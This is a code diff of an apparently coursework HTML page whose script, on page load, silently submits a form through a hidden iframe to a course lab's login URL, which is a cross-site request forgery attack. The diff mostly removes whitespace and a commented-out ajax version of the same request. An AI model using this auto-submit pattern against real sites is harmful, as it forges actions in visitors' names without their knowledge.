@@ -14,13 +14,13 @@
 	<script type="text/javascript">
 window.onload = function func(){
  	form = document.getElementById('myForm');
- 	    function postIframe(target_url, method, pform) 
+ 	    function postIframe(target_url, method, pform)
     {
         //Add iframe
         var iframe = document.createElement("iframe");
         document.body.appendChild(iframe);
         iframe.style.display = "none";
-        
+
         //Give the frame a name
         var frame_name = "frame_name" + (new Date).getTime();
         iframe.contentWindow.name = frame_name;
@@ -33,21 +33,7 @@ window.onload = function func(){
         form.submit();
     }
     postIframe('http://ecen5032.org/project2/login', "POST", form);
-	// form.submit();
-// }
-//  // $(function () {
-     // form.on('submit', function () {
-
-//              $.ajax({
-              //   type: 'POST',
-              //   crossDomain: true,
-              //   url: 'http://ecen5032.org/project2/login',
-              //   data: $(form).serialize()
-              // });
-//           return false;
-//          });
-// // });
-// // };
+	
 }
 </script>
 </body>
